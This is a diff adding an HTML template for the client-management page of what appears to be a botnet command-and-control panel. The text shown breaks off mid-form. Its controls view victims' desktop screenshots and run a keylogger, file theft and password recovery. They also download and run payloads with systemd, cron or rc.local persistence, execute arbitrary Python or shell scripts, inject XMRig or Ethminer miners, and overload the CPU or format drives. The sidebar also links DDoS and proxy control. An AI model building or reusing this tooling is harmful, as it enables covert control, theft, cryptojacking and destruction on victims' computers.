@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>{{.Name}} | Manage Client: {{.ClientUID}}</title>
+
+    <!-- Google Font: Source Sans Pro -->
+
+    <link href="../static/css/all.min.css" rel="stylesheet" />
+    <!-- Theme style -->
+    <link href="../static/css/adminlte.min.css" rel="stylesheet" />
+    <link href="../static/css/dataTables.bootstrap4.min.css" rel="stylesheet" />
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet" />
+    <link href="../static/css/buttons.bootstrap4.min.css" rel="stylesheet" />
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet" />
+    <link href="../static/css/select.bootstrap4.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="../static/css/toastr.min.css" />
+    <link rel="stylesheet" href="../static/codemirror/codemirror.css" />
+    <link rel="stylesheet" href="../static/codemirror/theme/ambiance.css" />
+    <link rel="stylesheet" href="../static/css/bootstrap-datetimepicker-build.css" />
+</head>
+
+<body class="hold-transition dark-mode sidebar-mini">
+<div class="wrapper">
+    <!-- Navbar -->
+    <nav class="main-header navbar navbar-expand navbar-gray-dark navbar-dark">
+        <!-- Left navbar links -->
+        <ul class="navbar-nav">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
+            </li>
+        </ul>
+
+        <!-- Right navbar links -->
+        <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="fullscreen" href="#" role="button">
+                    <i class="fas fa-expand-arrows-alt"> Full Screen</i>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../logout" role="button"><i class="fas fa-sign-out-alt"> Logout</i></a>
+            </li>
+        </ul>
+    </nav>
+    <!-- /.navbar -->
+
+    <!-- Main Sidebar Container -->
+    <aside class="main-sidebar sidebar-dark-primary elevation-4">
+        <!-- Brand Logo -->
+        <a href="../" class="brand-link">
+            <span class="brand-text font-weight-light"><center>{{.Name}}</center></span>
+        </a>
+
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <!-- Sidebar user panel (optional) -->
+            <div class="user-panel mt-3 pb-3 mb-3 d-flex">
+                <div class="image">
+                    <img src="../static/images/avatar6.jpg" class="img-circle elevation-2" alt="User Image" />
+                </div>
+                <div class="info">
+                    <a class="d-block">{{.Username}}</a>
+                </div>
+            </div>
+
+            <!-- Sidebar Menu -->
+            <nav class="mt-2">
+                <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
+                    <!-- Add icons to the links using the .nav-icon class
+   with font-awesome or any other icon font library -->
+                    <li class="nav-item">
+                        <a href="../" class="nav-link">
+                            <i class="nav-icon fas fa-tachometer-alt"></i>
+                            <p>
+                                Dashboard
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item menu-close">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-users"></i>
+                            <p>
+                                Clients
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="../clients/windows" class="nav-link">
+                                    <i class="nav-icon fab fa-windows"></i>
+                                    <p>Windows</p>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../clients/linux" class="nav-link">
+                                    <i class="fab fa-linux nav-icon"></i>
+                                    <p>Linux</p>
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+
+                    <li class="nav-item">
+                        <a href="../ddos" class="nav-link">
+                            <i class="nav-icon fas fa-network-wired"></i>
+                            <p>
+                                DDoS Control
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../socks" class="nav-link">
+                            <i class="nav-icon fas fa-project-diagram"></i>
+                            <p>
+                                Socks & Proxies
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item menu-close">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-tasks"></i>
+                            <p>
+                                Task Management
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="../tasks" class="nav-link">
+                                    <i class="nav-icon fas fa-list-ul"></i>
+                                    <p>
+                                        General Tasks
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="../onconnect" class="nav-link">
+                                    <i class="nav-icon fas fa-ethernet"></i>
+                                    <p>
+                                        On Connection Tasks
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../settings" class="nav-link">
+                            <i class="nav-icon fas fa-cogs"></i>
+                            <p>
+                                Settings
+                            </p>
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+            <!-- /.sidebar-menu -->
+        </div>
+        <!-- /.sidebar -->
+    </aside>
+
+    <!-- Content Wrapper. Contains page content -->
+    <div class="content-wrapper">
+        <!-- Content Header (Page header) -->
+        <div class="content-header">
+            <div class="container-fluid">
+                <div class="row mb-2">
+                    <div class="col-sm-6"></div>
+                    <!-- /.col -->
+                    <div class="col-sm-6"></div>
+                    <!-- /.col -->
+                </div>
+                <!-- /.row -->
+            </div>
+            <!-- /.container-fluid -->
+        </div>
+        <!-- /.content-header -->
+
+        <!-- Main content -->
+        <div class="content">
+            <div class="container-fluid">
+                <div class="card card-primary card-outline">
+                    <div class="card-header">
+                        <h3 class="card-title"><i class="fas fa-desktop"></i> Manage Client: <code>{{.ClientUID}}</code></h3>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-lg-6">
+                                <div class="card card-primary card-tabs">
+                                    <div class="card-header p-0 pt-1">
+                                        <ul class="nav nav-tabs" id="images-tabs-info-tab" role="tablist">
+                                            <li class="pt-2 px-3">
+                                                <h3 class="card-title"><i class="fas fa-image"></i> Views</h3>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link active" id="custom-tabs-two-desktop-tab" data-toggle="pill" href="#custom-tabs-two-desktop" role="tab" aria-controls="custom-tabs-two-desktop" aria-selected="true">
+                                                    <i class="fas fa-desktop"></i> Desktop
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </div>
+
+                                    <div class="tab-content" id="images-tabs-info-tabContent">
+                                        <div class="tab-pane fade show active" id="custom-tabs-two-desktop" role="tabpanel" aria-labelledby="custom-tabs-two-desktop-tab">
+                                            <form method="POST" id="screenshot" action="../issue/linux">
+                                                <div class="card-header">
+                                                    <h5 class="m-0">
+                                                        Desktop
+                                                        <div class="float-right">
+                                                            <h6>Last Update: <code>{{.ScreenshotDate}}</code></h6>
+                                                        </div>
+                                                    </h5>
+                                                </div>
+
+                                                <!-- /.card-header  {{.ClientScreenshot}}-->
+                                                <div class="card-body">
+                                                    <!--Base64 the image -->
+                                                    <center>
+                                                        <img
+                                                                id="screenshotimage"
+                                                                alt=""
+                                                                src="{{.ClientScreenshot}}"
+                                                                onerror="this.src='../static/images/noimage.jpg'"
+                                                                class="rounded"
+                                                                width="700"
+                                                                height="400"
+                                                                style="max-height: 100%; max-width: 100%;"
+                                                        />
+                                                    </center>
+
+                                                    <br />
+                                                    <a href="{{.ClientScreenshot}}" target="_blank" class="btn btn-info bg-gradient-primary"><i class="fas fa-expand-arrows-alt"></i> Fullscreen</a>
+                                                    <button class="btn btn-info bg-gradient-primary float-right" id="refeshScreen"><i class="fas fa-sync-alt"></i> Update</button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                    <!-- /.card -->
+                                </div>
+                            </div>
+                            <div class="col-lg-6">
+                                <div class="card card-primary card-tabs">
+                                    <div class="card-header p-0 pt-1">
+                                        <ul class="nav nav-tabs" id="custom-tabs-info-tab" role="tablist">
+                                            <li class="pt-2 px-3">
+                                                <h3 class="card-title"><i class="fas fa-info-circle"></i> Info</h3>
+                                            </li>
+                                            <!--   <li class="nav-item">
+                                         <a class="nav-link active" id="custom-tabs-two-client-tab" data-toggle="pill" href="#custom-tabs-two-client" role="tab" aria-controls="custom-tabs-two-client" aria-selected="false"> Controls</a>
+                                       </li>  -->
+                                            <li class="nav-item">
+                                                <a class="nav-link active" id="custom-tabs-two-home-tab" data-toggle="pill" href="#custom-tabs-two-home" role="tab" aria-controls="custom-tabs-two-home" aria-selected="true">
+                                                    System
+                                                </a>
+                                            </li>
+                                            <!--     <li class="nav-item">
+                                           <a class="nav-link" id="custom-tabs-two-profile-tab" data-toggle="pill" href="#custom-tabs-two-profile" role="tab" aria-controls="custom-tabs-two-profile" aria-selected="false"> Installed</a>
+                                         </li> -->
+                                            <li class="nav-item">
+                                                <a class="nav-link" id="custom-tabs-two-messages-tab" data-toggle="pill" href="#custom-tabs-two-messages" role="tab" aria-controls="custom-tabs-two-messages" aria-selected="false">
+                                                    Command Log
+                                                </a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" id="custom-tabs-two-settings-tab" data-toggle="pill" href="#custom-tabs-two-settings" role="tab" aria-controls="custom-tabs-two-settings" aria-selected="false">
+                                                    Admin Notes
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                    <div class="card-body">
+                                        <div class="tab-content" id="custom-tabs-info-tabContent">
+                                            <div class="tab-pane fade show active" id="custom-tabs-two-home" role="tabpanel" aria-labelledby="custom-tabs-two-home-tab">
+                                                <div class="form-group">
+                                                    <textarea class="form-control" rows="16" style="overflow: scroll;" disabled>{{.ClientInfo}}</textarea>
+                                                </div>
+                                            </div>
+                                            <div class="tab-pane fade" id="custom-tabs-two-profile" role="tabpanel" aria-labelledby="custom-tabs-two-profile-tab">
+                                                <table class="table table-striped table-borderless dark-mode" id="installedTable">
+                                                    <thead>
+                                                    <tr>
+                                                        <th>Application</th>
+                                                        <th>Location</th>
+                                                    </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                    {{ range .InstalledTables}}
+
+                                                    <tr>
+                                                        <td>{{.ApplicationName}}</td>
+                                                        <td>{{.ApplicationLocation}}</td>
+                                                    </tr>
+
+                                                    {{ end}}
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="tab-pane fade" id="custom-tabs-two-messages" role="tabpanel" aria-labelledby="custom-tabs-two-messages-tab">
+                                                <table class="table table-striped table-borderless dark-mode" id="commandLogTable">
+                                                    <thead>
+                                                    <tr>
+                                                        <th>ID</th>
+                                                        <th>Command</th>
+                                                        <th>Date</th>
+                                                        <th>Status</th>
+                                                    </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                    {{ range .CommandLogTables}}
+
+                                                    <tr>
+                                                        <td>{{.ID}}</td>
+                                                        <td>{{.CommandName}}</td>
+                                                        <td>{{.CommandDate}}</td>
+                                                        <td>{{.CommandStatus}}</td>
+                                                    </tr>
+
+                                                    {{ end}}
+                                                    </tbody>
+                                                </table>
+                                                <br />
+                                                <button type="button" class="btn btn-outline-danger btn-block" onclick="eStopCMD()"><i class="fas fa-hand-paper"></i> Delete Selected Command</button>
+                                            </div>
+                                            <div class="tab-pane fade" id="custom-tabs-two-settings" role="tabpanel" aria-labelledby="custom-tabs-two-settings-tab">
+                                                <form method="POST" id="note" action="../save/client/notes">
+                                                    <div class="form-group">
+                                                        <textarea class="form-control" rows="6" name="adminNotes" id="adminNotes" placeholder="...">{{.AdminNotes}}</textarea>
+                                                    </div>
+                                                    <div class="card-footer">
+                                                        <button class="btn btn-primary icon-btn" type="submit"><i class="fas fa-fw fa-lg fa-save"></i> Save Notes</button>&nbsp;&nbsp;&nbsp; &nbsp;
+                                                        <a class="btn btn-danger float-right" href="#" onclick="resetA()"><i class="fa fa-fw fa-lg fa-times-circle"></i> Clear Notes</a>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!-- /.card -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card card-primary card-outline">
+                    <div class="card-header">
+                        <h3 class="card-title"><i class="fas fa-terminal"></i> Control</h3>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-5 col-sm-3">
+                                <div class="nav flex-column nav-tabs h-100" id="vert-tabs-tab" role="tablist" aria-orientation="vertical">
+                                    <li class="nav-header">Commands</li>
+                                    <a class="nav-link active" id="vert-tabs-home-tab" data-toggle="pill" href="#vert-tabs-home" role="tab" aria-controls="vert-tabs-home" aria-selected="true">
+                                        <i class="nav-icon fas fa-dice-d6"></i> Basic
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-profile-tab" data-toggle="pill" href="#vert-tabs-profile" role="tab" aria-controls="vert-tabs-profile" aria-selected="false">
+                                        <i class="nav-icon fas fa-dice-d20"></i> Advanced
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-Keylogger-tab" data-toggle="pill" href="#vert-tabs-Keylogger" role="tab" aria-controls="vert-tabs-Keylogger" aria-selected="false">
+                                        <i class="nav-icon fas fa-keyboard"></i> Keylogger
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-FileStealer-tab" data-toggle="pill" href="#vert-tabs-FileStealer" role="tab" aria-controls="vert-tabs-FileStealer" aria-selected="false">
+                                        <i class="nav-icon fas fa-file-export"></i> File Hunter
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-remote-tab" data-toggle="pill" href="#vert-tabs-remote" role="tab" aria-controls="vert-tabs-remote" aria-selected="false">
+                                        <i class="nav-icon fas fa-wifi"></i> Remote Control
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-Recovery-tab" data-toggle="pill" href="#vert-tabs-Recovery" role="tab" aria-controls="vert-tabs-Recovery" aria-selected="false">
+                                        <i class="nav-icon fas fa-key"></i> Password Recovery
+                                    </a>
+                                    <li class="nav-header">Other</li>
+                                    <a class="nav-link" id="vert-tabs-tasks-tab" data-toggle="pill" href="#vert-tabs-tasks" role="tab" aria-controls="vert-tabs-tasks" aria-selected="false">
+                                        <i class="nav-icon fas fa-tasks"></i> Client Tasks
+                                    </a>
+                                    <a class="nav-link" id="vert-tabs-settings-tab" data-toggle="pill" href="#vert-tabs-settings" role="tab" aria-controls="vert-tabs-settings" aria-selected="false">
+                                        <i class="nav-icon fas fa-user-cog"></i> Client Controls
+                                    </a>
+                                </div>
+                            </div>
+
+                            <div class="col-7 col-sm-9">
+                                <div class="tab-content" id="vert-tabs-tabContent">
+                                    <div class="tab-pane text-left fade show active" id="vert-tabs-home" role="tabpanel" aria-labelledby="vert-tabs-home-tab">
+                                        <div class="card card-primary card-tabs">
+                                            <div class="card-header p-0 pt-1">
+                                                <ul class="nav nav-tabs" id="custom-tabs-basic-tab" role="tablist">
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link active"
+                                                                id="custom-tabs-basic-adv-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-basic-adv"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-basic-adv"
+                                                                aria-selected="true"
+                                                        >
+                                                            Standard
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-basic-fun-tab" data-toggle="pill" href="#custom-tabs-basic-fun" role="tab" aria-controls="custom-tabs-basic-fun" aria-selected="false">
+                                                            Fun and Games
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link"
+                                                                id="custom-tabs-basic-script-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-basic-script"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-basic-script"
+                                                                aria-selected="false"
+                                                        >
+                                                            Scripting
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link"
+                                                                id="custom-tabs-basic-other-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-basic-other"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-basic-other"
+                                                                aria-selected="false"
+                                                        >
+                                                            Other
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="tab-content" id="custom-tabs-basic-tabContent">
+                                                    <div class="tab-pane fade show active" id="custom-tabs-basic-adv" role="tabpanel" aria-labelledby="custom-tabs-basic-adv-tab">
+                                                        <div class="row">
+                                                            <!-- /.col-md-6 -->
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="issueDownloadnRun" method="post" name="issueDownloadnRun">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">
+                                                                                Download and Run
+                                                                                <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button>
+                                                                            </h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="row">
+                                                                                <div class="input-group mb-3">
+                                                                                    <div class="input-group-prepend">
+                                                                                        <span class="input-group-text">File</span>
+                                                                                    </div>
+                                                                                    <input type="text" class="form-control" id="file" required placeholder="www.example.com/file.exe" />
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="form-group">
+                                                                                <div class="custom-control-inline custom-switch">
+                                                                                    <input type="checkbox" class="custom-control-input float-right" id="startup" />
+                                                                                    <label class="custom-control-label float-right" name="startup" onclick="downloadnrunSta()" for="startup">Startup</label>
+                                                                                </div>
+                                                                                <div class="form-group" id="hidden1">
+                                                                                    <div class="form-group">
+                                                                                        <select class="form-control" id="startupmethod" name="startupmethod">
+                                                                                            <option value="systemd">
+                                                                                                systemd
+                                                                                            </option>
+                                                                                            <option value="cron">
+                                                                                                Cron
+                                                                                            </option>
+                                                                                            <option value="rclocal">
+                                                                                                rc.local
+                                                                                            </option>
+                                                                                        </select>
+                                                                                        <!-- IP mask -->
+                                                                                    </div>
+                                                                                </div>
+                                                                                <!--   <div class="custom-control-inline custom-switch" >
+                                                                               <input type="checkbox" class="custom-control-input float-right" id="droplo">
+                                                                               <label class="custom-control-label float-right" name="droplo"  for="droplo">Custom Drop</label>
+                                                                             </div> -->
+                                                                            </div>
+                                                                        </div>
+                                                                    </form>
+
+                                                                </div>
+                                                                <!--     <div class="card card-primary card-outline">
+                                                               <form action="../issue/linux" class="form-horizontal" id="run" method="post" name="run">
+
+                                                                 <div class="card-header">
+                                                                   <h5 class="m-0">Run <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button></h5>
+
+                                                                 </div>
+                                                                 <div class="card-body">
+                                                                   <div class="input-group mb-3">
+                                                                     <div class="input-group-prepend">
+                                                                       <span class="input-group-text">C:\</span>
+                                                                     </div>
+                                                                     <input type="text" class="form-control"  id="para" placeholder="start calc.exe">
+                                                                   </div>
+                                                                 </div>
+                                                               </form>
+                                                             </div>
+                                                             -->
+                                                            </div>
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="seedTorrent" method="post" name="seedTorrent">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">
+                                                                                Torrent Seeder
+                                                                                <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button>
+                                                                            </h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="input-group mb-3">
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text">Torrent</span>
+                                                                                </div>
+                                                                                <input type="text" class="form-control" id="torrentfile" required placeholder="www.example.com/cars3.torrent" />
+                                                                            </div>
+                                                                        </div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+                                                            <!-- /.col-md-6 -->
+                                                        </div>
+                                                    </div>
+                                                    <div class="tab-pane fade show" id="custom-tabs-basic-fun" role="tabpanel" aria-labelledby="custom-tabs-basic-fun-tab">
+                                                        <div class="row">
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <div class="card-header">
+                                                                        <h5 class="m-0">Harmless</h5>
+                                                                    </div>
+                                                                    <div class="card-body">
+                                                                        <center><code>Will go away after reboot</code></center>
+                                                                        <!-- 0xRR -->
+
+                                                                        <button type="button" name="0xXXXX" data-rn="XXXX" onclick="issuecommand(this)" class="btn btn-block bg-gradient-info btn-sm">
+                                                                            FIND SOMETHING TO ADD HERE
+                                                                        </button>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <!-- /.col-md-6 -->
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <div class="card-header">
+                                                                        <h5 class="m-0">Harmful</h5>
+                                                                    </div>
+                                                                    <div class="card-body">
+                                                                        <center><code>May damage host system</code></center>
+
+                                                                        <button type="button" name="0xCPU" data-rn="Overload CPU" onclick="issuecommand(this)" class="btn btn-block bg-gradient-warning btn-sm">
+                                                                            Overload CPU
+                                                                        </button>
+                                                                        <button type="button" name="0xFMTC" data-rn="Format C:\" onclick="issuecommand(this)" class="btn btn-block bg-gradient-warning btn-sm">
+                                                                            Format Drive
+                                                                        </button>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <!-- /.col-md-6 -->
+                                                        </div>
+                                                    </div>
+                                                    <div class="tab-pane fade show" id="custom-tabs-basic-other" role="tabpanel" aria-labelledby="custom-tabs-basic-other-tab">
+                                                                <div class="card card-primary card-outline">
+                                                                    <div class="card-header">
+                                                                        <h5 class="m-0">
+                                                                            DNS Block <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button>
+                                                                        </h5>
+                                                                    </div>
+                                                                    <div class="card-body">
+                                                                        <div class="form-group">
+                                                                                    <textarea class="form-control" id="hosts" rows="4" required name="code">
+
+                                                                                    </textarea>
+                                                                        </div>
+                                                                        <center><code>Edits System Host file. Admin Needed.</code></center>
+                                                                    </div>
+                                                                </div>
+                                                    </div>
+                                                    <div class="tab-pane fade show" id="custom-tabs-basic-script" role="tabpanel" aria-labelledby="custom-tabs-basic-script-tab">
+                                                        <center><code>Scripts will be dropped with a random name and ran.</code></center>
+                                                        <form action="../issue/linux" class="form-horizontal" id="scripting" method="post" name="scripting">
+                                                            <div class="form-group">
+                                                                <textarea class="form-control" id="code" rows="6" required name="code"></textarea>
+                                                            </div>
+
+                                                            <div class="input-group input-group-sm">
+                                                                <div class="input-group mb-3">
+                                                                    <select class="custom-select" onchange="selectMode()" id="selectScript">
+                                                                        <option data-rn="OxP2" value="Python2">
+                                                                            Python 2
+                                                                        </option>
+                                                                        <option data-rn="0xP3" value="Python3">
+                                                                            Python 3
+                                                                        </option>
+                                                                        <option data-rn="OxSHELL" value="Shell">
+                                                                            Shell
+                                                                        </option>
+                                                                    </select>
+                                                                    <span class="input-group-append">
+                                                                                <button type="submit" class="btn btn-info btn-flat">Send</button>
+                                                                            </span>
+                                                                </div>
+                                                                <!-- /.col-md-6 -->
+                                                            </div>
+                                                        </form>
+                                                    </div>
+                                                </div>
+                                                <!-- /.card -->
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="tab-pane fade" id="vert-tabs-profile" role="tabpanel" aria-labelledby="vert-tabs-profile-tab">
+                                        <div class="card card-primary card-tabs">
+                                            <div class="card-header p-0 pt-1">
+                                                <ul class="nav nav-tabs" id="custom-tabs-one-tab" role="tablist">
+                                                     <li class="nav-item">
+                                                <a class="nav-link active" id="custom-tabs-xmr-adv-tab"
+                                                   data-toggle="pill" href="#custom-tabs-xmr-adv" role="tab"
+                                                   aria-controls="custom-tabs-xmr-adv" aria-selected="true">Crypto Miner</a>
+                                            </li>
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link"
+                                                                id="custom-tabs-one-Proxies-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-one-Proxies"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-one-Proxies"
+                                                                aria-selected="false"
+                                                        >
+                                                            Proxies
+                                                        </a>
+                                                    </li>
+                                                    <!-- <li class="nav-item">
+                                                <a class="nav-link" id="custom-tabs-one-upnp-tab"
+                                                   data-toggle="pill" href="#custom-tabs-one-upnp" role="tab"
+                                                   aria-controls="custom-tabs-one-upnp" aria-selected="false">UPnP</a>
+                                            </li> -->
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-one-server-tab" data-toggle="pill" href="#custom-tabs-one-server" role="tab" aria-controls="custom-tabs-one-server" aria-selected="false">
+                                                            Micro Server
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-one-others-tab" data-toggle="pill" href="#custom-tabs-one-others" role="tab" aria-controls="custom-tabs-one-others" aria-selected="false">
+                                                            Other
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="tab-content" id="custom-tabs-one-tabContent">
+                                                    <div class="tab-pane fade show active" id="custom-tabs-xmr-adv" role="tabpanel" aria-labelledby="custom-tabs-xmr-adv-tab">
+                                                        <div class="card card-primary card-outline">
+                                                            <form action="../issue/linux" class="form-horizontal" id="xmrminer" method="post" name="xmrminer">
+                                                                <div class="card-header">
+                                                                    <h5 class="m-0">
+                                                                        Crypto Miner
+                                                                        <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fas fa-fw fa-lg fa-syringe"></i> Inject</button>
+                                                                    </h5>
+                                                                </div>
+                                                                <div class="card-body">
+                                                                    <div class="input-group mb-3">
+                                                                        <div class="input-group-prepend">
+                                                                            <span class="input-group-text">Module</span>
+                                                                        </div>
+                                                                        <select class="custom-select" id="minerModule" name="minerModule">
+                                                                            <option disabled selected value="">
+                                                                                Select a Module
+                                                                            </option>
+                                                                            <option data-rn="xmr" value="xmr">
+                                                                                XMR (XMRig)
+                                                                            </option>
+                                                                            <option data-rn="eth" value="eth">
+                                                                                Ethereum (Ethminer)
+                                                                            </option>
+                                                                        </select>
+                                                                    </div>
+                                                                </div>
+                                                            </form>
+                                                            <div class="card-footer">&nbsp;Status: <code>{{.XMRMinerState}}</code></div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-one-Proxies" role="tabpanel" aria-labelledby="custom-tabs-one-Proxies-tab">
+                                                        <div class="row">
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="socks5" method="post" name="socks5">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">
+                                                                                SOCKS5
+                                                                                <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fas fa-fw fa-lg fa-toggle-on"></i> Toggle</button>
+                                                                            </h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="input-group">
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text"><i class="fas fa-laptop"></i></span>
+                                                                                </div>
+                                                                                <input type="text" class="form-control" placeholder="xxx.xxx.xxx.xxx" id="ipv4" name="ipv4" data-inputmask="'alias': 'ip'" data-mask="" />
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text"><i class="fab fa-megaport"></i></span>
+                                                                                </div>
+                                                                                <input class="form-control" placeholder="80" type="number" min="20" max="99999" id="port" value="8090" name="port" />
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="card-footer">&nbsp;Status: <code>{{.SOCKS5}}</code></div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="socks5" method="post" name="socks5">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">
+                                                                                HTTP Proxy
+                                                                                <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fas fa-fw fa-lg fa-toggle-on"></i> Toggle</button>
+                                                                            </h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="input-group">
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text"><i class="fas fa-laptop"></i></span>
+                                                                                </div>
+                                                                                <input type="text" class="form-control" placeholder="xxx.xxx.xxx.xxx" id="ipv4" name="ipv4" data-inputmask="'alias': 'ip'" data-mask="" />
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text"><i class="fab fa-megaport"></i></span>
+                                                                                </div>
+                                                                                <input class="form-control" placeholder="80" type="number" min="20" max="99999" id="port" value="8090" name="port" />
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="card-footer">&nbsp;Status: <code>{{.SOCKS5}}</code></div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+
+                                                            <!-- /.col-md-6 -->
+                                                            <!--    <div class="col-lg-6">
+                                                        <div class="card card-primary card-outline">
+                                                            <form action="../issue/linux"
+                                                                  class="form-horizontal" id="rProxy"
+                                                                  method="post" name="rProxy">
+                                                                <div class="card-header">
+                                                                    <h5 class="m-0">Reverse Proxy
+                                                                        <div class="float-right"><input
+                                                                                type="checkbox"
+                                                                                name="proxycheck"
+                                                                                id="proxycheck"
+                                                                                data-bootstrap-switch></div>
+                                                                    </h5>
+                                                                </div>
+                                                                <div class="card-body">
+
+                                                                    <div class="input-group mb-3">
+
+                                                                        <input class="form-control"
+                                                                               placeholder="8080" type="number"
+                                                                               min="5" max="99999" id="pport"
+                                                                               value="1648" name="port">
+                                                                        <div class="input-group-append">
+                                                                            <div class="input-group-text">
+                                                                                <span class="fab fa-megaport"></span>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="input-group mb-3">
+                                                                        <input type="text" class="form-control"
+                                                                               name="username"
+                                                                               placeholder="Username" required>
+                                                                        <div class="input-group-append">
+                                                                            <div class="input-group-text">
+                                                                                <span class="fas fa-user"></span>
+                                                                            </div>
